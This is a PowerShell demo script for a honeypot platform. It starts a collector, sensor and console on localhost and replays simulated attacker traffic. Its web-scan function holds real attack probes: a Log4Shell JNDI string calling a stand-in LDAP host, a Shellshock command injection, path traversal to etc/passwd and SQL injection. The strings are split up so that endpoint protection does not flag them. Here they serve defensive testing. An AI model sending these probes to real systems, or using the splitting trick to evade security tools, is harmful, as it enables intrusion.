<#
.SYNOPSIS
  Runs the full platform locally with the operator console attached.

.DESCRIPTION
  Brings up the message bus, collector, and a sensor with every protocol
  enabled, drives them with simulated attacker traffic, runs the profiling
  pipeline, and leaves the console serving so you can look at it.

  Geo coordinates are synthetic. Every session in a local run originates from
  127.0.0.1, which has no location, so the map is fed deterministic fake
  coordinates that are flagged as such all the way through the API and labelled
  in the UI. Nothing here should be mistaken for attribution.

  Ctrl-C to stop; the script tears everything down on exit.
#>
[CmdletBinding()]
param(
    [int]    $Runs     = 3,
    [int]    $Parallel = 4,
    [int]    $ApiPort  = 8088,
    [int]    $SshPort  = 2222,
    [int]    $TelnetPort = 2323,
    [int]    $HttpPort = 8080,
    [int]    $RdpPort  = 3389,
    [int]    $NatsPort = 4222,
    [switch] $NoTraffic
)

$ErrorActionPreference = 'Stop'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$root = Resolve-Path (Join-Path $scriptDir '..')
$work = Join-Path $root '.demo'

function Find-NatsServer {
    $cmd = Get-Command nats-server -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $found = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\WinGet\Packages" -Recurse `
        -Filter nats-server.exe -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) { return $found.FullName }
    throw "nats-server not found. Install with: winget install NATSAuthors.NATSServer"
}

$procs = @()
function Start-Component {
    param([string]$Name, [string]$Exe, [string[]]$ArgList)
    Write-Host "  $Name" -ForegroundColor DarkGray
    $log = Join-Path $work "$Name.log"
    $p = Start-Process -FilePath $Exe -ArgumentList $ArgList -PassThru `
        -RedirectStandardOutput $log -RedirectStandardError "$log.err" -WindowStyle Hidden
    $script:procs += $p
    return $p
}

function Stop-Components {
    foreach ($p in $script:procs) {
        if ($p -and -not $p.HasExited) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
        }
    }
}

function Wait-ForPort {
    param([int]$Port, [int]$TimeoutSec = 25, [string]$What = 'service')
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
        if (Test-NetConnection -ComputerName 127.0.0.1 -Port $Port -InformationLevel Quiet -WarningAction SilentlyContinue) {
            return
        }
        Start-Sleep -Milliseconds 250
    }
    throw "$What did not open port $Port"
}

# Scanner-shaped HTTP traffic, so the web decoys and the attack analyzer have
# something to chew on. Assembled at request time rather than stored as literal
# payload strings, which endpoint protection tends to quarantine on sight.
function Invoke-WebScan {
    param([string]$Base)

    $jndi = '$' + '{jndi:' + 'ldap' + '://198.51.100.7:1389/a}'
    $probes = @(
        @{ Path = '/';                                  UA = 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' },
        @{ Path = '/.env';                              UA = 'python-requests/2.31.0' },
        @{ Path = '/.git/config';                       UA = 'python-requests/2.31.0' },
        @{ Path = '/wp-login.php';                      UA = 'WPScan v3.8.22' },
        @{ Path = '/actuator/env';                      UA = 'Java/11.0.16' },
        @{ Path = '/solr/admin/cores';                  UA = 'curl/7.68.0' },
        @{ Path = '/manager/html';                      UA = 'Mozilla/5.0 zgrab/0.x' },
        @{ Path = '/cgi-bin/test.cgi';                  UA = '() ' + '{ :; }' + '; /bin/bash -c "id"' },
        @{ Path = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'; UA = 'Mozlila/5.0' },
        @{ Path = '/download?file=' + ('../' * 4) + 'etc/passwd'; UA = 'curl/7.68.0' },
        @{ Path = '/item.php?id=1%20UNION%20SELECT%201,2,3'; UA = 'sqlmap/1.7' },
        @{ Path = '/';                                  UA = $jndi }
    )

    foreach ($p in $probes) {
        try {
            Invoke-WebRequest -Uri ($Base + $p.Path) -UserAgent $p.UA -TimeoutSec 5 `
                -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
        } catch {}
        Start-Sleep -Milliseconds 120
    }

    # A decoy login submission, so credential capture on the web side fires too.
    try {
        Invoke-WebRequest -Uri ($Base + '/phpmyadmin/index.php') -Method POST `
            -Body @{ pma_username = 'root'; pma_password = 'toor' } `
            -UserAgent 'python-requests/2.31.0' -TimeoutSec 5 -UseBasicParsing `
            -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    # Open a planted canary, which is the loudest event the platform produces.
    $tok = & (Join-Path $root 'bin\honeynode.exe') -honeyfiles (Join-Path $work 'honeyfiles') `
        -config (Join-Path $work 'none.json') 2>$null |
        Select-String -Pattern 'token=(\w+)' | ForEach-Object { $_.Matches[0].Groups[1].Value } |
        Select-Object -First 1
    if ($tok) {
        try {
            Invoke-WebRequest -Uri "$Base/static/img/$tok.png" -TimeoutSec 5 `
                -UserAgent 'Microsoft Office Word 2016' -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
        } catch {}
    }
}

# ------------------------------------------------------------------ setup --

if (Test-Path $work) { Remove-Item $work -Recurse -Force }
New-Item -ItemType Directory -Force -Path $work | Out-Null

$eventsFile  = Join-Path $work 'events.jsonl'
$profileFile = Join-Path $work 'profile.json'
$natsExe = Find-NatsServer
$nodeExe = Join-Path $root 'bin\honeynode.exe'
$simExe  = Join-Path $root 'bin\attacksim.exe'
$collExe = Join-Path $root 'collector\target\release\honeynet-collector.exe'
$dashDir = Join-Path $root 'dashboard\dist'

foreach ($e in @($nodeExe, $simExe, $collExe)) {
    if (-not (Test-Path $e)) { throw "missing binary: $e  (run scripts\build.ps1)" }
}
if (-not (Test-Path (Join-Path $dashDir 'index.html'))) {
    throw "dashboard not built. Run: cd dashboard; npm install; npm run build"
}

Write-Host "`nhoneynet demo" -ForegroundColor Cyan
Write-Host ("=" * 60)

try {
    Write-Host "`nstarting" -ForegroundColor Cyan
    Start-Component -Name 'nats' -Exe $natsExe -ArgList @('-p', "$NatsPort", '-a', '127.0.0.1') | Out-Null
    Wait-ForPort -Port $NatsPort -What 'nats-server'

    Start-Component -Name 'collector' -Exe $collExe -ArgList @(
        '--nats-url',      "nats://127.0.0.1:$NatsPort",
        '--events-jsonl',  $eventsFile,
        '--api-addr',      "127.0.0.1:$ApiPort",
        '--dashboard-dir', $dashDir,
        '--profile-path',  $profileFile,
        '--geoip-synthetic',
        '--stats-interval', '30'
    ) | Out-Null
    Wait-ForPort -Port $ApiPort -What 'collector api'

    $env:HONEYNODE_ID            = 'sensor-demo-01'
    $env:HONEYNODE_SEED          = 'sensor-demo-01'
    $env:HONEYNODE_NATS_URL      = "nats://127.0.0.1:$NatsPort"
    $env:HONEYNODE_SSH_ADDR      = "127.0.0.1:$SshPort"
    # Assigning '' to $env: removes the variable rather than blanking it, so a
    # port has to be given explicitly or the sensor falls back to its default.
    $env:HONEYNODE_TELNET_ADDR   = "127.0.0.1:$TelnetPort"
    $env:HONEYNODE_HTTP_ADDR     = "127.0.0.1:$HttpPort"
    $env:HONEYNODE_RDP_ADDR      = "127.0.0.1:$RdpPort"
    $env:HONEYNODE_SPOOL         = Join-Path $work 'node.spool'
    $env:HONEYNODE_HOST_KEY      = Join-Path $work 'hostkey'
    $env:HONEYNODE_CALLBACK_HOST = "127.0.0.1:$HttpPort"
    $env:HONEYNODE_HEARTBEAT_SEC = '10'

    Start-Component -Name 'sensor' -Exe $nodeExe -ArgList @('-config', (Join-Path $work 'none.json')) | Out-Null
    Wait-ForPort -Port $SshPort -What 'sensor ssh'
    Wait-ForPort -Port $HttpPort -What 'sensor http'

    if (-not $NoTraffic) {
        Write-Host "`nreplaying attacker traffic" -ForegroundColor Cyan
        & $simExe -addr "127.0.0.1:$SshPort" -runs $Runs -parallel $Parallel -seed 20260725
        Write-Host "  web scan"
        Invoke-WebScan -Base "http://127.0.0.1:$HttpPort"
        Start-Sleep -Seconds 3
    }

    Write-Host "`nprofiling" -ForegroundColor Cyan
    $py = Join-Path $root 'ml\.venv\Scripts\python.exe'
    if ((Test-Path $py) -and (Test-Path $eventsFile)) {
        & $py -m honeynet_ml.cli report $eventsFile --out $profileFile 2>&1 |
            ForEach-Object { "  $_" }
        # Loading the report attaches cluster labels to sessions in the console.
        try {
            Invoke-WebRequest -Uri "http://127.0.0.1:$ApiPort/api/profile" -UseBasicParsing -TimeoutSec 20 | Out-Null
            Write-Host "  profile applied"
        } catch { Write-Host "  profile not applied: $_" -ForegroundColor Yellow }
    } else {
        Write-Host "  skipped (ml venv not built)" -ForegroundColor Yellow
    }

    Write-Host "`n" + ("=" * 60)
    Write-Host "console:  http://127.0.0.1:$ApiPort/" -ForegroundColor Green
    Write-Host "events:   $eventsFile"
    Write-Host "logs:     $work"
    Write-Host "`nsensor listening on ssh :$SshPort  http :$HttpPort  rdp :$RdpPort"
    Write-Host "Ctrl-C to stop.`n" -ForegroundColor DarkGray

    while ($true) { Start-Sleep -Seconds 3600 }

} finally {
    Write-Host "`nstopping" -ForegroundColor DarkGray
    Stop-Components
}
